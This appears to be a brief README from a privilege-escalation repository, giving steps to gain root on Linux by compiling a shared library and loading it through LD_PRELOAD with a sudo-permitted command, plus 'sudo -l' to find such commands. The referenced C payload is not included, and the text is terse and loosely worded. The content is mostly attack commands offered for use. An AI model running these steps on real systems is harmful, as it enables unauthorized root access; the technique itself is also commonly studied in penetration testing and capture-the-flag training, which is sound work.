# LD_PRELOAD
Escalate to root with simple c language LD_PRELOAD code

Run this code
---------------

gcc -fPIC -shared -nostartfiles -o /tmp/x.so x.c
sudo LD_PRELOAD=/tmp/x.so <input any list running as root> 

# Find list running as root by typing the command below

sudo -l
